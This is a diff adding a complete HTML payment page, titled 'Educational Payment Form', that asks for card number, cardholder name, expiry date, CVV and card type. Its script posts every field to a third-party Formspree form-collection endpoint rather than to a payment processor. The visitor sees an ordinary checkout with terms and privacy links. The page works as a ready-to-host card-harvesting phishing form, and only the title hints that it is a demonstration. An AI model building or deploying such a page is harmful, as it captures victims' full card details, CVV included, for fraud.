@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational Payment Form</title>
+    <style>
+        /* General styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            padding: 30px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            max-width: 450px;
+            width: 100%;
+        }
+
+        h2 {
+            font-size: 26px;
+            margin-bottom: 20px;
+            color: #333;
+            text-align: center;
+        }
+
+        .form-field {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #d1d1d1;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .form-field:focus {
+            outline: none;
+            border-color: #0070ba;
+        }
+
+        .form-field.error {
+            border-color: red;
+        }
+
+        .form-field::placeholder {
+            color: #999;
+        }
+
+        .select-field {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #d1d1d1;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .select-field option {
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+            background-color: #005f8a;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Enter Payment Information</h2>
+
+        <form id="payment-form">
+            <input type="text" name="Card Number" id="card-number" class="form-field" placeholder="Card Number" required inputmode="numeric" pattern="[0-9]{16}">
+            <input type="text" name="Card Name" id="card-name" class="form-field" placeholder="Name on Card" required inputmode="text">
+            <input type="text" name="Expiry Date" id="expiry-date" class="form-field" placeholder="MM/YY" required inputmode="numeric" pattern="\d{2}/\d{2}">
+            <input type="text" name="CVV" id="cvv" class="form-field" placeholder="CVV" required inputmode="numeric" pattern="\d{3}">
+            
+            <select name="Card Type" id="card-type" class="select-field" required>
+                <option value="">Select Card Type</option>
+                <option value="Visa">Visa</option>
+                <option value="MasterCard">MasterCard</option>
+                <option value="American Express">American Express</option>
+                <option value="Discover">Discover</option>
+            </select>
+            
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+
+        <div class="footer">
+            <p>By submitting this form, you agree to our <a href="#">terms of service</a> and <a href="#">privacy policy</a>.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Collect the card data from the form
+            const formData = new FormData(event.target);
+
+            // Send data to Formspree backend
+            fetch('https://formspree.io/f/xrbeovrd', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json'
+                },
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Your payment info has been submitted! (Sent to Formspree)');
+                    event.target.reset(); // Reset the form
+                } else {
+                    alert('Error submitting form.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            });
+        });
+    </script>
+
+</body>
+</html>
